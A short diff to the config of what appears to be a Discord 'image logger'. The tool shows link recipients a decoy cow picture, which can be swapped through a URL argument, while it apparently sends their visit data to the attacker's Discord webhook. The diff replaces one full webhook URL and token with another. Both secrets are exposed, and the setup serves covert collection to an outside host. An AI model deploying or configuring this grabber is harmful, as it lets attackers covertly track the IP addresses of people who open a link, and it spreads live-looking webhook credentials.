@@ -12,7 +12,7 @@ __author__ = "DICK"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m",
+    "webhook": "https://discord.com/api/webhooks/1391537322230681781/9j-bd2eZR4P9nsyrt9M-dMBOpNTGKgwfoqEloAr_NQVrzZNEBgik6iH0hRi8NImGP06p",
     "image": "https://cdn.britannica.com/55/174255-050-526314B6/brown-Guernsey-cow.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
